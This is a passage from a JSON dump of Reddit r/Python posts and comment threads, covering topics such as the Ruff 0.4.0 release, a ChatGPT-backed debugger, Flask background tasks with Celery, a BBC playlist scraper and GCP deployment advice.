                    "replies": [
                        {
                            "author": "trollsmurf",
                            "score": "1",
                            "content": "I understand now :). Sounds useful."
                        }
                    ]
                }
            ]
        },
        {
            "author": "hotplasmatits",
            "score": "5",
            "content": "I'm going to have to look into your project, bc when I read your description all I can think is def read_file(path): # either return pd.read_parquet(path) #or return pd.read_csv(path) # or similar one liner for json, db, pickle, etc. I don't understand what problem you're solving.",
            "replies": [
                {
                    "author": "hotplasmatits",
                    "score": "2",
                    "content": "I've read the github description but didn't watch the videos. I'm confused. You said network drive above, but say cloud database on github. Autocomplete is done by your ide, not your code. C# style attributes are called properties in python. What does 'storing data in a notebook' mean? Are you not writing your data out to files when using your notebooks? From the github description, your library sounds very specific to genetics and a specific commercial database so I don't think I'll have a use for it."
                }
            ]
        },
        {
            "author": "runawayasfastasucan",
            "score": "2",
            "content": "I dont understand how this relates to your headline/Jupyter notebooks.",
            "replies": [
                {
                    "author": "IllogicalLunarBear",
                    "score": "2",
                    "content": "Well it was originally in a post asking people why they use Jupyter labs and everyone said they use it to run chunks of code so that they don’t have to re-run code to populate the same variables over and over again and that is what I do with this software but I don’t need to use Jupyter labs… I can use any IDE to do the same thing. The mods removed the post as they said I was repeating a question despite giving an option to replace that use case as they evidently did not even bother to read the post before removing it."
                }
            ]
        },
        {
            "author": "arden13",
            "score": "2",
            "content": "I don't understand how this improves upon standard ETL practices. If your pipeline goes down just re-execute? If having variables pre-loaded is helpful for your work just save *.joblib files. Otherwise it seems like this is not very different from redis in concept (or at least what I understood from the docs).",
            "replies": [
                {
                    "author": "IllogicalLunarBear",
                    "score": "2",
                    "content": "It takes a week to pre-load those variables for my use-case due to the massive amounts of computation that must be done beforehand running 24/7 on a i9. This data cannot be stored in memory and must be stored in a disk for data permanence Edit: in case it’s not clear I am processing thousands of RNA sequences and holding onto all the genomic data generated by academic RNA folding models and then I perform novel computation of the data to generate novel metrics to explain the behavior of the RNA. It a lot of data that you do not want on volatile memory"
                }
            ]
        },
        {
            "author": "britishbanana",
            "score": "2",
            "content": "You might also find the zope object database project pretty interesting, if a bit old at this point. Your project seems to have a lot in common with 'object databases' which aim to persist objects directly in a data store. Another very interesting concept which may be more directly related to your workis durable computing, which the temporal framework is pushing forward. Of note, this type of object serialization you're doing is notoriously slow in Python and tends not to scale well to millions and billions of objects which is part of why object databases never really took off. It brings a decent amount of portability issues as well, such as having to access data that was generated at a certain time with a specific version of the library that encoded it, which is a huge footgun when relying on on-disk objects over longer periods of time where it's more likely breaking changes will need to be introduced for some reason or another. You might also find metaclasses / metaprogramming could help you do some of that class creation code generation stuff your doing with raw strings (which looks quite gnarly to build and maintain). It's definitely an advanced topic but it unlocks a lot of really cool dynamic code creation. Cool project though, I can see you put a lot of effort into it! ZODB: https://zodb.org/en/latest/  Temporal: https://docs.temporal.io/temporal"
        },
        {
            "author": "[deleted]",
            "score": "1",
            "content": "Im trying to offer a replacment not ask a question.. bad bot",
            "replies": [
                {
                    "author": "IllogicalLunarBear",
                    "score": "3",
                    "content": "Im trying to offer a replacment not ask a question.. bad bot"
                }
            ]
        }
    ]
},
{
    "post_author": "tootac",
    "post_id": "1ca6lyv",
    "post_score": "0",
    "post_time": "Monday, April 22, 2024 at 12:42:42 PM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "Single file, hot reloading python server with raw websockets and inotify",
    "media": [
        "https://hereket.com/posts/linux_live_reload_python_server/"
    ],
    "post_content": "A project to build a local server without any external dependencies with main features of hot reloading browser on source modification. The idea is to make it simple, standalone and work without any setup.\nThe project uses regular sockets, websockets, inotify and a bit of javascript on the fly embedding to allow users to achieve automatic synchronization with browser. The article describes hot to monitor file changes with direct loading of libc and requesting kernel notify on change.\nFree article and code: https://hereket.com/posts/linux_live_reload_python_server/",
    "comments": []
},
{
    "post_author": "the1024",
    "post_id": "1c7abe8",
    "post_score": "0",
    "post_time": "Thursday, April 18, 2024 at 9:15:02 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "chatpdb - gpt for your python debugger",
    "media": [
        "https://github.com/shobrook/stackexplain",
        "https://github.com/gotcha/ipdb",
        "https://github.com/Never-Over/chatpdb",
        "https://docs.python.org/3/library/pdb.html"
    ],
    "post_content": "https://github.com/Never-Over/chatpdb\nDo you ever copy code, errors, or stack traces into ChatGPT? We did, and found it frustrating to always have to manually find, copy, and paste each relevant piece of information. On top of that, being forced to change tools would switch our focus and cause us to lose our flow. That’s why we built chatpdb  - a python debugger with ChatGPT!\nSimply use chatpdb like you would use ipdb or pdb; it’s a drop in replacement with the exact same functionality. The only addition is the new y keyword, which will trigger a response from ChatGPT.\nHere’s how it works:\n> /Programming/test-chatpdb/lib.py(2)echo_platform()\n      1 def echo_platform(platform: str):\n----> 2     print(\"You are running on:\" + platform)\n      3\nipdb> y \nThe exception occurred because the function `echo_platform` tries to concatenate the string \"You are running on:\" with the `platform` variable, which is `None`. [...]\nIn this example, chatpdb correctly diagnoses an error in the current function as being caused by a bug in the calling function. chatpdb automatically passes relevant context about your program, including the source code, stack trace, and error information if available to ChatGPT.\nIf you have a more specific question you can also supply a prompt to y:\n> /Programming/test-chatpdb/lib.py(2)echo_platform()\n      1 def echo_platform(platform: str):\n----> 2     print(\"You are running on:\" + platform)\n      3\nipdb> y \"Why is platform coming through as None?\"\nThe variable `platform` is coming through as `None` because the environment variable `\"PLATFORM\"` is not set in your system's environment variables. [...]\nIt’s easy to install and set up:\npip install chatpdb\nexport OPENAI_API_KEY=....\nimport chatpdb\nchatpdb.set_trace()\nWhat my project does: A drop-in replacement for ipdb or pdb, with ChatGPT built in.\nTarget audience: anyone who currently uses ChatGPT to debug or ask questions about their code.\nComparison: Copilot offers similar functionality, but is a much heavier tool and harder to turn off/ignore when you don’t want it. stackexplain is probably the closest tool; however it lacks the ability to hook into your program in any other way than fully running the python process.\nchatpdb meets you where you are – AI tooling that’s only invoked when you need it. We hope you give it a try! We’d love any feedback or suggestions.\nDocs",
    "comments": []
},
{
    "post_author": "driscollis",
    "post_id": "1caaapb",
    "post_score": "13",
    "post_time": "Monday, April 22, 2024 at 4:06:49 PM GMT+3",
    "flair_text": "News",
    "post_title": "Announcing The Python Logging Book & Course Kickstarter",
    "media": [
        "https://www.kickstarter.com/projects/driscollis/python-logging-book-and-course"
    ],
    "post_content": "New developers print out strings to their terminal. It’s how we learn! But printing out to the terminal isn’t what you do with most professional applications.\nIn those cases, you log into files. Sometimes, you log into multiple locations at once. These logs may serve as an audit trail for compliance purposes or help the engineers debug what went wrong.\nPython Logging teaches you how to log in the Python programming language. Python is one of the most popular programming languages in the world. Python comes with a logging module that makes logging easy.\nWhat You’ll Learn\nIn this book, you will learn how about the following:\nLogger objects\nLog levels\nLog handlers\nFormatting your logs\nLog configuration\nLogging decorators\nRotating logs\nLogging and concurrency\nand more!\nBook formats\nThe finished book will be made available in the following formats:\npaperback (at the appropriate reward level)\nPDF\nepub\nThe paperback is a 6″ x 9″ book and is approximately 150 pages long.\nYou can check out the book's campaign on Kickstarter.\nLet me know if you have any questions!",
    "comments": [
        {
            "author": "rhytnen",
            "score": "22",
            "content": "Uhhh ... so ill just leave this here. https://docs.python.org/3/howto/logging.html https://docs.python.org/3/howto/logging-cookbook.html"
        },
        {
            "author": "pingveno",
            "score": "4",
            "content": "Perhaps spare a mention for structured logging (structlog)?",
            "replies": [
                {
                    "author": "driscollis",
                    "score": "2",
                    "content": "I do cover structlog and loguru in their own chapters as well"
                }
            ]
        },
        {
            "author": "monorepo",
            "score": "3",
            "content": "Neat!",
            "replies": [
                {
                    "author": "driscollis",
                    "score": "1",
                    "content": "Thanks! I see you like Ruff. That's a neat project too. Charlie and his team are doing a lot of neat things"
                }
            ]
        },
        {
            "author": "psicodelico6",
            "score": "0",
            "content": "Pattern loggings?"
        },
        {
            "author": "db_mdubs",
            "score": "-3",
            "content": "Looking forward to the course…",
            "replies": [
                {
                    "author": "driscollis",
                    "score": "-3",
                    "content": "Thanks! I think it will be fun. I'll be releasing it on Udemy in addition to my own site"
                }
            ]
        }
    ]
},
{
    "post_author": "Nicolas-Rougier",
    "post_id": "fvcvfw",
    "post_score": "1766",
    "post_time": "Sunday, April 5, 2020 at 3:13:01 PM GMT+3",
    "flair_text": "I Made This",
    "post_title": "Matplotlib 3D bar plots",
    "media": [
        "https://external-preview.redd.it/N1VmDERXjHwstt6NyKt70gGxp19GYLWbQVSGPm30tbQ.png?width=640&crop=smart&auto=webp&s=a7dceaeeb6a2969a3d64a6c22711425a9a6a1df0",
        "https://raw.githubusercontent.com/rougier/matplotlib-3d/master/doc/bar.png"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "Nicolas-Rougier",
            "score": "42",
            "content": "Link: https://github.com/rougier/matplotlib-3d/blob/master/doc/README.md"
        },
        {
            "author": "ohsnapdragons",
            "score": "65",
            "content": "So this is how they modeled the terrain for Skyrim"
        },
        {
            "author": "CompSciSelfLearning",
            "score": "20",
            "content": "Not to take anything away from the coding aspect of this project, but how is this not worse than a heat map?"
        },
        {
            "author": "[deleted]",
            "score": "6",
            "content": "Looks like Giant’s Causeway."
        },
        {
            "author": "socauchy",
            "score": "3",
            "content": "Could do alot with this and scientific modelling. Curious if you have any experience with modelling reaction-diffusion systems?"
        },
        {
            "author": "novel_eye",
            "score": "2",
            "content": "Do you have a function for this that I can just dump some data in? This would be perfect to analyze a covariance matrix I have that I have. When the variables are sorted by a certain metric the correlation decays linearly. Would be very cool."
        },
        {
            "author": "Sigg3net",
            "score": "2",
            "content": "Add the GoT titles music and call it a day!"
        },
        {
            "author": "LuigiBrotha",
            "score": "3",
            "content": "Plotly has some great graphs which also has the ability to make 3d plots. Personally I find it easier to use and looks great. Especially the animations are awesome."
        },
        {
            "author": "[deleted]",
            "score": "1",
            "content": "Really cool. Thanks man."
        }
    ]
},
{
    "post_author": "neozhaoliang",
    "post_id": "gx67cu",
    "post_score": "1875",
    "post_time": "Friday, June 5, 2020 at 6:02:01 PM GMT+3",
    "flair_text": "I Made This",
    "post_title": "Do you know what a 5D cube is like? Let's rotate it in 5D, project to 3d and render it in 2D! (Things you can do with Python and POV-Ray)",
    "media": [
        "https://external-preview.redd.it/koMBX8gT52WStb_kENYo4_WGOPO3otNwzTAN4rN_X9M.png?format=pjpg&auto=webp&s=f33393f20a80d59d89e4c4bb4a32a1491b2b5a06"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "mfurlend",
            "score": "68",
            "content": "What would a 4D cube look like? Or is that a nonsensical question for some reason?",
            "replies": [
                {
                    "author": "[deleted]",
                    "score": "",
                    "content": "It looks like a projection, not a cross-section: all the sub-parts are distorted cuboids, not any other shapes that would be created by cutting.",
                    "replies": [
                        {
                            "author": "wnoise",
                            "score": "62",
                            "content": "It looks like a projection, not a cross-section: all the sub-parts are distorted cuboids, not any other shapes that would be created by cutting."
                        },
                        {
                            "author": "zrnest",
                            "score": "22",
                            "content": "The cross section of a 3D cube with a hyperplane (2D) can give a square, a triangle, a quadrilateral, an hexagon, etc.. Similarly, the cross section of a 4D cube with a 3D hyperplane could be many different things I guess? Has anyone a GIF animation of the 3D-plane-cross-section of a rotating 4D cube? Would be great!"
                        },
                        {
                            "author": "SanJJ_1",
                            "score": "4",
                            "content": "wouldn't a cross section of a 4d cube just be a normal 3d cube?"
                        }
                    ]
                },
                {
                    "author": "meatatfeast",
                    "score": "10",
                    "content": "4D version is called tesseract if I recall, it looks a little bit like the OP but with one less dimension... To picture it in your head, consider how we get from a square (2D cube) to a 3D cube. The edges of a square define a plane. A line perpendicular to all the edges will point straight out of the plane; that is our new dimension. Create a duplicate square, shift it in the direction of that new dimension, and then connect all the vertices to their twins. So if the square is ABCD and our new square is A'B'C'D' we connect A to A' and so on. Now we have a cube. Carry out the process again: create a duplicate cube and shift it in a direction that is perpendicular to all 3 of our cube dimensions. At this point it becomes hard to visualize, but we now have two cubes that are next to each other in the 4th dimension. So we connect all the matching vertices on each cube, and now we have a tesseract. This can be done again, in the 5th dimension, to get a 5D cube. Bonus points: how do we define a one dimensional cube, and why?",
                    "replies": [
                        {
                            "author": "mfurlend",
                            "score": "4",
                            "content": "Cool thanks for the explanation. The way I’ve been picturing a 4D cube is like a Russian doll, except instead of other cubes being contained inside the first cube they are “elsewhere.”"
                        },
                        {
                            "author": "glider97",
                            "score": "2",
                            "content": "Doesn't a cube, by definition, exist only in 3D? The rendition of a cube in 2D would be a 2D shape, so I'm assuming a rendition of a cube in 1D would be a line or a dot."
                        }
                    ]
                },
                {
                    "author": "derioderio",
                    "score": "2",
                    "content": "It's called a hypercube. You can find lots of animations online for a rotating hypercube."
                },
                {
                    "author": "concacid",
                    "score": "2",
                    "content": "This amazing video explains it pretty well."
                },
                {
                    "author": "[deleted]",
                    "score": "2",
                    "content": "You can't picture it. A 3d ball put into a 2d world would simply look like a circle. It's the same deal with 4d objects and our world."
                }
            ]
        },
        {
            "author": "neozhaoliang",
            "score": "68",
            "content": "I haven't post on this subreddit for months since it's becoming more and more difficult to make new math animations, and the math involved are getting quite complicated now. So I decide to release a few example with the already posted code. Maybe you can keep an eye on the pywonderland project? This subproject was motivated by Jos Leys' work at http://www.josleys.com/show_gallery.php?galid=341 You can run lots of polytope examples with this script: https://github.com/neozhaoliang/pywonderland/blob/master/src/polytopes/example_polytope_animation.py You need to install POV-Ray before you can run it, and make sure the commands `povray` and `ffmpeg` can be called from system terminal."
        },
        {
            "author": "alifeinbinary",
            "score": "5",
            "content": "The Flatlanders! Great project, just wish this clip was longer and looping so I could get lost in it. I'm always 3D printing tesseracts because of this book (Flatlanders) / Carl Sagan's explanation in Cosmos."
        },
        {
            "author": "mfurlend",
            "score": "3",
            "content": "My ability to picture this type of stuff sucks, but if anyone is interested there is an awesome scifi book called Quantum Space, which talks a lot about what the 3D world would look like if you are offset in the Ana or Kata direction (4th spatial dimension)."
        },
        {
            "author": "ave_63",
            "score": "3",
            "content": "Is \"project to 3D and render in 2D\" the same thing as \"project to 2D\", other than the graphical effects like shading?"
        },
        {
            "author": "[deleted]",
            "score": "5",
            "content": "What... did my eyes just watch?"
        },
        {
            "author": "emsiem22",
            "score": "2",
            "content": "Wow! I like it! That is cool idea. Kudos. I would love to look at this in VR."
        },
        {
            "author": "Nemloh",
            "score": "2",
            "content": "Even though I can see it, it's more dimensions than I can grasp.. Nice work though, looks very nice!"
        }
    ]
},
{
    "post_author": "zacky2004",
    "post_id": "1c6ei5h",
    "post_score": "11",
    "post_time": "Wednesday, April 17, 2024 at 7:36:32 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Handling of long-running processes with timeouts in Flask + Gunicorn API app",
    "media": [],
    "post_content": "I run an API (Python + Flask + Gunicorn) which has an endpoint that's calls a nested processes, which can sometimes take 6 seconds, to sometimes 60+ seconds to complete. The time it takes isn't a measure of my API's performance really, but rather its bottlenecked by an external service that the process has to rely on. Im looking for any suggested libraries that can safely handle this secondary process asynchronously with a long timeout. Ideally the API endpoint is called, and it won't have to wait for this process to finish if it takes more than 30+ seconds.\nHere's a mockup of what the chain of commands look like.\nProcess 1: core.slurm.SlurmUser - addSlurmUser took: 1.6083331108093262. This process then calls core.slurm.SlurmUser - addScratch (which takes sometimes 6 seconds, sometimes 30+ seconds)\nChild Process 2: core.slurm.SlurmUser - addScratch took: 29.492394208908081\nAny advice? Am I missing something that I can take advantage of already? The App is built using Flask + Gunicorn workers. Wondering If Celery is something that can nicely integrate with my current setup, or is it something that would replace Gunicorn in this scenario?",
    "comments": [
        {
            "author": "thatrandomnpc",
            "score": "9",
            "content": "Gunicorn is a webserver which serves your web application (flask). Celery on the other hand is an async task queue and worker, it cannot replace gunicorn but will definitely work for your use case of offloading long running processes. Note that celery is a separate server/process apart from your gunicorn + flask app. This could be useful. https://flask.palletsprojects.com/en/2.3.x/patterns/celery/",
            "replies": [
                {
                    "author": "zacky2004",
                    "score": "2",
                    "content": "Thank you! I might go with this option. Wondering if theres a light version of celery? one that doesn’t rely on redis"
                }
            ]
        },
        {
            "author": "Terrible_Ad_6915",
            "score": "2",
            "content": "You could try RQ to run those processes in the background, it has a simple setup and also provides a nice visualization tool rq-dashboard",
            "replies": [
                {
                    "author": "mr_claw",
                    "score": "1",
                    "content": "+1 for RQ"
                }
            ]
        },
        {
            "author": "forcefx2",
            "score": "1",
            "content": "Celery"
        }
    ]
},
{
    "post_author": "QueasyEntrance6269",
    "post_id": "1c7v2ax",
    "post_score": "275",
    "post_time": "Friday, April 19, 2024 at 2:58:44 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Ruff 0.4.0 just dropped, with a faster parser and a new language server ",
    "media": [
        "https://astral.sh/blog/ruff-v0.4.0"
    ],
    "post_content": "Release notes here, seems to be a 20-40% improvement around the board.\nThis version features a new hand-written parser (rather than a generated one) that is much faster and offers better error messages. It also comes with a new rust-native language server inspired by rust-analyzer, that is multithreaded. I think they’re challenging Pylance’s throne, wouldn’t be surprised if the team goes after type checking next.",
    "comments": [
        {
            "author": "striata",
            "score": "73",
            "content": "The better error messages is probably the best part about this. The performance improvement, while large, is negligible (at least for developers) when we're already the realm of milliseconds.",
            "replies": [
                {
                    "author": "Toph_is_bad_ass",
                    "score": "24",
                    "content": "This comment has been overwritten.",
                    "replies": [
                        {
                            "author": "striata",
                            "score": "22",
                            "content": "The benchmark on their blog lists a 450ms to 364ms improvement in runtime against the home-assistant/core repo. This project is around 500 000 lines of code. I doubt anyone will care (or even notice!) that a step in their CI pipeline now completes in 1.6 seconds instead of 2 seconds, but I can imagine that they care about the 100+ second improvement from moving away from flake8/black/isort/whatever to ruff!",
                            "replies": [
                                {
                                    "author": "Usual_Office_1740",
                                    "score": "3",
                                    "content": "Last time I did research about this ruff was faster but didn't offer nearly the set of options when compared to something like flake8. Is that still the case?"
                                },
                                {
                                    "author": "Sigmatics",
                                    "score": "1",
                                    "content": "Yeah they're already faster than other linters by orders of magnitude, but great that they still care about performance on that level."
                                }
                            ]
                        },
                        {
                            "author": "Scrapheaper",
                            "score": "4",
                            "content": "I work for a large enterprise but we would never care about this. Not a tech enterprise though, maybe like a hundred devs and a few hundred semi-technicals. I think you would care if you had a giant codebase, but not sure how giant the largest codebases are",
                            "replies": [
                                {
                                    "author": "ExplorerOutrageous20",
                                    "score": "3",
                                    "content": "You should care. Reducing time in the feedback cycle means less context switching and better quality software in less time. Better quality and less bugs means delivering projects faster and for less cost, while also letting developers work on cool shiny things instead of boring bugs. What's not to love about improving the developer experience (DevEx)?"
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "chub79",
            "score": "114",
            "content": "ruff is awesome. That said, I can't say I feel confident with the strategy now they have been funded. Not long before their VC starts asking what they intend on doing to make it profitable. Everyone is open source until it's time to monetize.",
            "replies": [
                {
                    "author": "SuddenlyBANANAS",
                    "score": "43",
                    "content": "At least there is always a way to fork and turn it into a community project if push comes to shove no?"
                },
                {
                    "author": "QueasyEntrance6269",
                    "score": "15",
                    "content": "I agree tbh, but I’m cautiously optimistic they’ll find a solid revenue flow given dev tools are a really profitable industry (c suite gets turned on from dev productivity, devs love shiny new tools, etc)"
                },
                {
                    "author": "Sigmatics",
                    "score": "2",
                    "content": "ruff is great for giving them exposure. Otherwise nobody would know their company. They could offer additional tooling for profit - ruff extensions/plugins, or other tools based on their new project uv"
                }
            ]
        },
        {
            "author": "ProsodySpeaks",
            "score": "16",
            "content": "Oh that's good, I keep thinking how horribly slow ruff is 😂"
        },
        {
            "author": "Ok_Expert2790",
            "score": "12",
            "content": "Pylance is a blessing and a curse, it’s been giving such bad memory errors for me lately — I had to switch back to Jedi for a bit",
            "replies": [
                {
                    "author": "__Deric__",
                    "score": "6",
                    "content": "I would add that not being open source is a curse too since its popularity hinders other language servers which can be used freely (for example with forks like VSCodium)."
                },
                {
                    "author": "ogrinfo",
                    "score": "5",
                    "content": "Totally - the Pylance VSCode plugin is great when it works and a total pain when it doesn't. I've tried raising tickets but I don't really have a repro case. My colleague sitting next to me and working on the same repo doesn't have the same issues ¯⁠\\⁠_⁠(⁠ツ⁠)⁠_⁠/⁠¯"
                }
            ]
        },
        {
            "author": "Financial-Ad7755",
            "score": "1",
            "content": "Sorry i am new to this but what is Ruff?"
        },
        {
            "author": "Difficult-Ambition61",
            "score": "-6",
            "content": "",
            "replies": [
                {
                    "author": "LALife15",
                    "score": "2",
                    "content": "just for formatting? ruff format"
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "",
            "content": "Are you though?",
            "replies": [
                {
                    "author": "mothzilla",
                    "score": "2",
                    "content": "Are you though?"
                }
            ]
        },
        {
            "author": "RoboticSystemsLab",
            "score": "-13",
            "content": ""
        },
        {
            "author": "russellvt",
            "score": "-15",
            "content": "",
            "replies": [
                {
                    "author": "QueasyEntrance6269",
                    "score": "9",
                    "content": "what platforms are you developing python on that don't have LLVM available??"
                },
                {
                    "author": "Datsoon",
                    "score": "5",
                    "content": "One of the nice things about rust is that distributing binaries is super easy. If you want to compile from source, then yeah, that sucks."
                }
            ]
        }
    ]
},
{
    "post_author": "dfpena83",
    "post_id": "djk4vm",
    "post_score": "1766",
    "post_time": "Friday, October 18, 2019 at 10:41:42 AM GMT+3",
    "flair_text": "",
    "post_title": "I made a Python Node editing IDE and it has saved me hours in development time and made my code ridiculously reusable",
    "media": [],
    "post_content": "",
    "comments": [
        {
            "author": "Yoda1802",
            "score": "157",
            "content": "Hello I am a math teacher in a french high school and i am really interested. Can i try the test version and next how can we buy licences of this software ? Thank you a lot for this tool",
            "replies": [
                {
                    "author": "dfpena83",
                    "score": "44",
                    "content": "Update (2022): Massively updated this software since this post you can check out our progress at https://www.stremecoder.com and our free to use web app: https://pluricorp.com/stremecoder I have big plans this year for StremeCoder2 making python web3 ---------------------------------------------------------------------------------------------------------------- I was genuinely not expecting the massive response to my post and caught completely off guard. My phone vibrated itself to death last night with PM requests. I responded as much as one human could reasonably respond. I'm pretty sure my tester code is dead by now. We had enough purchases that there was talk of capping out the (90% aka buy it for $6.00) discount code. I will be posting examples to my github later today and tomorrow:https://github.com/dfpena If anyone else is interested in grabbing a copy you can get it:https://gumroad.com/pluri Discount code: 75tp3e1 Thank you guys for all the interest and feedback",
                    "replies": [
                        {
                            "author": "[deleted]",
                            "score": "7",
                            "content": "This so awesome. Gracias amigo."
                        },
                        {
                            "author": "sc0ut_0",
                            "score": "5",
                            "content": "Thanks for the code--I just bought it! I am excited to try it out."
                        },
                        {
                            "author": "[deleted]",
                            "score": "3",
                            "content": "Thanks I have been looking for a good way to teach young children programming and I think I just found it."
                        }
                    ]
                },
                {
                    "author": "ab845",
                    "score": "6",
                    "content": "[ Sorry, ignore my previous comment. I looked at a wrong link.]"
                },
                {
                    "author": "dfpena83",
                    "score": "2",
                    "content": "Definitely"
                }
            ]
        },
        {
            "author": "__Engeniero__",
            "score": "66",
            "content": "Which gui framework you used?"
        },
        {
            "author": "SamF111",
            "score": "61",
            "content": "I think it looks like you've reeinvented LabVIEW?"
        },
        {
            "author": "phineas0fog",
            "score": "57",
            "content": "Nice job :) Is it open-source ?"
        },
        {
            "author": "notgettingfined",
            "score": "39",
            "content": "For anyone interested in visual programming here are some open source options to look at. Luna data processing and visualization https://www.luna-lang.org/#Overview XOD for microcontrollers https://xod.io/ Node-red for event driven applications https://nodered.org/ Scratch for Android development https://scratch.mit.edu/ Netlab for internet of things http://www.netlabtoolkit.org/"
        },
        {
            "author": "[deleted]",
            "score": "11",
            "content": "Looks nice! Is it possible to have outputs connect to multiple inputs?"
        },
        {
            "author": "emolinare",
            "score": "9",
            "content": "It's sort of like Scratch programming, but simplified. In my view, Streme as illustrated here can help someone who is new to Python coding, but I can't imagine (looking at the video), that someone can change the source image faster using graphical interface than I could do manually just by commenting out one line and uncommenting the other. In any case, it could be useful for new coders, but once your program gets really complex, you'll be wasting time just to find your visual node."
        },
        {
            "author": "beat3r",
            "score": "10",
            "content": "This looks great for non-coders, but I'm hesitant to support this for professional devs. Keyboard shortcuts give me the best \"speed boost\" when it comes to coding. In my free time, I like to develope with Vim (GASP). What takes me forever? Naming classes. It's hard not to name a class ParseEngineControllerForThisThingGodThisNameIsSoLong."
        },
        {
            "author": "SuperH02",
            "score": "5",
            "content": "Is it open source?"
        },
        {
            "author": "[deleted]",
            "score": "4",
            "content": "Maybe you'd like Slinkie."
        }
    ]
},
{
    "post_author": "Jazzlike-Compote4463",
    "post_id": "1c4wsmn",
    "post_score": "102",
    "post_time": "Monday, April 15, 2024 at 11:34:37 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Some days I really love python...",
    "media": [
        "https://www.bbc.co.uk/programmes/articles/5JDPyPdDGs3yCLdtPhGgWM7/bbc-radio-6-music-playlist",
        "https://railway.app/",
        "https://pypi.org/project/ytmusicapi/"
    ],
    "post_content": "I have a problem that I was terrible at listening to new music, everything I listen to is from around 2000 - 2010.\nThere is a radio station here in the UK called BBC 6 music that has a decent playlist but since I only really listen in the car its not always appropriate to note the track names down - and my memory is terrible so I always forget by the time I get home.\nLuckily they put the playlist online but it's just text links so I can't add it to my music service of choice - YouTube Music.\nThankfully the page is pretty simple so I wrote a basic ass scraper that will grab the HTML, parse through the tracks with beautful soup, then use the ytmusicapi package to remove the old tracks from my playlist and recreate it with the freshly scraped data, railway then makes it dead easy to deploy and schedule it to run once a day.\nThis thing took me probably less than an hour and a half to create and will hopefully open me up to some quality new tunes!",
    "comments": [
        {
            "author": "Pepineros",
            "score": "43",
            "content": "basic ass scraper The difference one hyphen would have made.",
            "replies": [
                {
                    "author": "Leftover_Salad",
                    "score": "11",
                    "content": "https://xkcd.com/37/"
                },
                {
                    "author": "taukeh",
                    "score": "6",
                    "content": "What ass scraper would you recommend?"
                }
            ]
        },
        {
            "author": "buqr",
            "score": "15",
            "content": "Nice! Being able to automate things like this feels like a superpower, sometimes I question how I'd manage without it. A recent one for me was trying to recover some images from a shitty cloud storage service. There were thousands of images, but the UI didn't work when trying to download more than a couple of images at once. Online forums suggested you'd just have to go through and download the images one at a time manually. So of course, I worked out what requests the UI was making, and wrote a Python script to automate the process, which was pretty fun and worked flawlessly in the end!"
        },
        {
            "author": "graphicteadatasci",
            "score": "8",
            "content": "Projects that are just for yourself are the best projects"
        },
        {
            "author": "nicktids",
            "score": "3",
            "content": "There is an api that creates the show tracklists and is json encoded with musicbrains ids. I'll see if I can find my code if you're interested Can you share your code I have a similar project for all the 6 music morning shows Edit: now see your just after the main play list. I'm after all the shows tracklists for curating a DB of everything ever played",
            "replies": [
                {
                    "author": "Jazzlike-Compote4463",
                    "score": "1",
                    "content": "I'll have to look at annoymising it first, this thing was just for me really",
                    "replies": [
                        {
                            "author": "nicktids",
                            "score": "1",
                            "content": "All good I see simple page to scrape."
                        }
                    ]
                }
            ]
        },
        {
            "author": "Sigmatics",
            "score": "2",
            "content": "Glad you found my project useful :) - ytmusicapi creator"
        },
        {
            "author": "taukeh",
            "score": "1",
            "content": "Impressive! I have been struggling to transfer my playlists from my old acc to the one on YT music. I wonder if I can do that with the help of the api…"
        },
        {
            "author": "Leftover_Salad",
            "score": "1",
            "content": "Nice!  First time I've heard about railway, how are you liking it?"
        }
    ]
},
{
    "post_author": "ste042024",
    "post_id": "1c6b77i",
    "post_score": "16",
    "post_time": "Wednesday, April 17, 2024 at 5:23:41 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Deploying Multi-Module Python Applications on GCP: Service Recommendations?",
    "media": [],
    "post_content": "I'm working on a project involving a Python application with multiple interacting modules and am looking for some advice on deploying it efficiently on Google Cloud Platform. Here's a brief overview of what the application entails:\nFunctionality Overview:\n• Data Fetching: One module fetches data from external websites.\n• Data Extraction: Another module extracts data from another GCP project.\n• Data Processing: Variables are processed across various modules.\n• CSV Output: The app generates and stores CSV files.\n• Scheduled Running: The application should run automatically once daily.\nI would greatly appreciate your insights on the following questions:\nWhat are the best GCP services to use for this type of application?\nRecommended Python libraries for handling web data retrieval in this case?\nHow to proceed step by step? I intend to first deploy my Python application using placeholder inputs and simple printed outputs. Then, I plan to integrate the data fetching component and implement the creation and storage of CSV files. Does this strategy seem logical to you?\nCurrently, I only tried to deploy my Python code using Google Cloud Functions, but I find this method impractical because I must deploy each module separately. I would prefer a solution that allows me to deploy all my code at once, where the Python modules can smoothly pass variables among themselves.\nThank you in advance for your help!",
    "comments": [
        {
            "author": "josh_flow",
            "score": "4",
            "content": "I would recommend Cloud Run Jobs - Cloud Run is essentially the successor to Cloud Functions and is a bit easier to work with imo. Cloud Run has a bunch of sample projects here. At a high level you would: Create a single Python project for all your modules --> Build a Docker image for your project --> Upload to Artifact Registry --> Configure a Cloud Run Job instance to run your project at a regular interval. Some other random thoughts: GCS buckets are a great way to share data between steps / job runs Selenium is a great tool for web scraping Ray Actors would make your state management a lot simpler, but there is a bit of a learning curve to using Ray",
            "replies": [
                {
                    "author": "chub79",
                    "score": "3",
                    "content": "Configure a Cloud Run Job instance to run your project at a regular interval. And to do this, you'll need Google Cloud Scheduler (just thought I'd clariify how this is done :))"
                }
            ]
        }
    ]
},
{
    "post_author": "davidmezzetti",
    "post_id": "i8ygwi",
    "post_score": "1871",
    "post_time": "Thursday, August 13, 2020 at 2:49:34 PM GMT+3",
    "flair_text": "Machine Learning",
    "post_title": "txtai: AI-powered engine for contextual search and extractive question-answering",
    "media": [
        "https://preview.redd.it/x8zbv0zqcrg51.gif?width=640&crop=smart&format=png8&s=9a3542bb50f306aa3ae9a8d24a859d3d85dbe56e"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "ecuracosta",
            "score": "55",
            "content": "This sounds very interesting! Could you tell what a new from a newspaper is about with this or it works the other way around only? You will need yo predifine some topics?"
        },
        {
            "author": "davidmezzetti",
            "score": "74",
